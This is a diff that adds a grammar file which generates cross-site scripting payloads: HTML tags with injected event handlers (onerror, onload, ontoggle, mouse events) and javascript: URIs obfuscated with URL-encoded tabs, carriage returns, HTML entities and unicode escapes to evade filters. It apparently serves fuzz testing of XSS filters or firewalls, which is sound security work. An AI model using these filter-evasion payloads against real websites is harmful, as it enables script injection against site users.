@@ -1,0 +1,62 @@
+start : attriContext | eventContext;
+
+//### Injection Context ###
+attriContext : opLt attributeAttack efilling opEqual efilling jscript lfilling end clickWord | opLt formTag filling tabWord opEqual terDigitOne filling actionAttri efilling opEqual efilling jscript lfilling opGt opLt inputTag filling typeWord opEqual submitWord opGt;
+eventContext : opLt eventHandlerAttack efilling opEqual efilling alertScript lfilling end clickWord;
+
+//### Attack type ###
+eventHandlerAttack : onToggleTag filling onToggleWord | mouseKeyTag filling editWord filling mouseKeyWord | inputTag filling formWord | buttonTag filling buttonWord | onLoadTag filling onLoadWord | onErrorTag filling srcAttri sinslash typeWord opEqual imageTag filling onLoadWord opEqual sinslash filling onErrorWord | inputTag filling onauxClickWord;
+attributeAttack : hrefTag filling hrefAttri | formTag opGt opLt formActionTag filling typeWord opEqual submitWord filling formActionAttri | srcTag filling srcAttri | dataTag filling dataAttri;
+
+//### Tag and KeyWord ###
+imageTag : 'img';
+hrefTag : 'a';
+inputTag : 'input';
+bodyTag : 'body';
+svgTag : 'svg';
+audioTag : 'audio';
+formTag : 'form';
+videoTag : 'video';
+onToggleTag : 'details';
+buttonTag : 'button';
+dataAttri : 'data';
+mouseKeyTag : hrefTag | 'a2' | imageTag | inputTag | bodyTag | 'd3v' | svgTag | audioTag | 'audio2' | formTag | videoTag | 'iframe' | onToggleTag | 'html' | 'abbr' | 'acronym' | 'address' | 'animate' | 'animatemotion' | 'animatetransform' | 'article' | 'aside' | 'b' | 'bdi' | 'bdo' | 'big' | 'blink' | 'blockquote' | 'br' | buttonTag | 'center' | 'cite' | 'code' | 'content' | 'custom' | dataAttri | 'dd' | 'del' | 'dfn' | 'dir' | 'discard' | 'div' | 'dl' | 'dt' | 'element' | 'em' | 'fieldset' | 'figcaption' | 'figure' | 'font' | 'footer' | 'h1' | 'header' | 'hgroup' | 'i' | 'iframe2' | 'image2' | 'image3' | 'img2'  | 'ins' | 'isindex' | 'kbd' | 'label' | 'legend' | 'li' | 'listing' | 'main' | 'map' | 'mark' | 'marquee' | 'menu' | 'menuitem' | 'multicol' | 'nav' | 'nextid' | 'ol' | 'output' | 'picture' | 'plaintext' | 'pre' | 'q' | 'ruby' | 's' | 'samp' | 'section' | 'set' | 'shadow' | 'small' | 'spacer' | 'span' | 'strike' | 'strong' | 'sub' | 'summary' | 'sup' | 'time';
+mouseKeyWord : 'onclick' | 'ondblclick' | 'onmouseover' | 'onmousemove' | 'onmouseout' | 'onmouseup' | 'onmousedown' | 'onmouseenter' | 'onmouseleave' | 'onkeydown' | 'onkeyup' | 'onkeypress' | 'onpointerenter' | 'onpointermove' | 'onpointerout' | 'onpointerleave' | 'onpointerdown' | 'onpointerover' | 'onpointerup' | 'onbeforecopy' | 'onbeforecut';
+editWord : 'contenteditable';
+onblurWord : 'onblur';
+onfocusWord : 'onfocus';
+formWord : 'onchange' | 'onselect' | onblurWord | onfocusWord;
+buttonWord : onblurWord | onfocusWord;
+onToggleWord : 'ontoggle';
+onLoadTag : bodyTag | svgTag;
+onLoadWord : 'onload';
+onErrorTag : imageTag | audioTag | bodyTag | inputTag | videoTag;
+onErrorWord : 'onerror';
+onauxClickWord : 'onauxclick';
+clickWord : 'XSS';
+tabWord : 'tabindex';
+hrefAttri : 'href';
+actionAttri : 'action' | 'onsubmit' | onblurWord | onfocusWord;
+formActionTag : buttonTag | inputTag;
+formActionAttri : 'formaction';
+typeWord : 'type';
+submitWord : 'submit';
+srcTag : 'embed' | scriptTag;
+scriptTag : 'script';
+srcAttri : 'src';
+dataTag : 'object';
+
+//### Operators and constants ###
+opLt : '<';
+opGt : '>';
+opEqual : '=';
+alertscript:=terDQuote 'alert(XSS)' terDQuote | terDQuote '\u0061lert(XSS)' terDQuote | 'alert(XSS)' | '\u0061lert(XSS)'
+jscript:=terDQuote 'javascript%26%2300058;alert(XSS)' terDQuote | terDQuote 'jav%0Dascript:\u0061lert(XSS)' terDQuote | terDQuote 'jav\u0061script%26colon;alert(XSS)' terDQuote | terDQuote 'java%26Tab;script%26colon;alert(XSS)' terDQuote | terDQuote 'jav%09ascript%26colon;alert(XSS)' terDQuote | terDQuote 'jav%0Dascript%26colon%3B\u0061lert(XSS)' terDQuote | terDQuote 'jav%0Dascript%26colon%3B\u0061lert%26%23x28;XSS%26%23x29;' terDQuote | terDQuote 'jav%09ascript%26colon%3B\u0061lert(XSS)' terDQuote | terDQuote 'jav%26Tab%3Bascript%26colon%3B\u0061lert(XSS)' terDQuote | terDQuote 'jav%09ascript%26colon%3B\u0061lert%26%23x28;XSS%26%23x29;' terDQuote | terDQuote 'jav%26Tab%3Bascript%26colon%3B\u0061lert%26%23x28;XSS%26%23x29;' terDQuote | terDQuote '\u0061lert(XSS)' terDQuote | 'alert(XSS)' | '\u0061lert(XSS)'
+t1 : '%09';
+lfilling : '%0dx';
+end : opGt | sinslash sinslash;
+sinslash : '/';
+filling : t1 | '%0a' | '%0d' | '/+/';
+efilling : t1 | '%0a' | '%0d' | '+';
+terDQuote : '"';
+terDigitOne : '1';
